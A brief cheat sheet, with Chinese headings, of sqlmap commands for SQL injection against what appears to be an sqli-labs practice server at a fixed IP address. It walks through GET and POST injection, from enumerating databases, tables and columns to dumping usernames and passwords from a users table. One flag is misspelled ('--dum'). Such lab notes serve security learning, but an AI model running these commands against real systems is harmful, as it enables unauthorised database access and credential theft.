# sqlmap

## 标准GET

```sh
sqlmap -u http://47.95.141.60:8844/Less-1/?id=1
sqlmap -u http://47.95.141.60:8844/Less-1/?id=1 -dbs
sqlmap -u http://47.95.141.60:8844/Less-1/?id=1 --current-db
sqlmap -u http://47.95.141.60:8844/Less-1/?id=1 -D security --tables
sqlmap -u http://47.95.141.60:8844/Less-1/?id=1 -D security -T users --columns
sqlmap -u http://47.95.141.60:8844/Less-1/?id=1 -D security -T users -C password,username --dum
```

## 标准POST

```sh
sqlmap -u http://47.95.141.60:8844/Less-11/ --forms
sqlmap -u http://47.95.141.60:8844/Less-11/ --forms --dbs
```

```sh
sqlmap -r burp.txt -p uname      
sqlmap -r burp.txt -p uname  --dbs
```

```sh
sqlmap -u http://47.95.141.60:8844/Less-11/ --data "uname=111&passwd=111&submit=Submit"
sqlmap -u http://47.95.141.60:8844/Less-11/ --data "uname=111&passwd=111&submit=Submit" --dbs
```

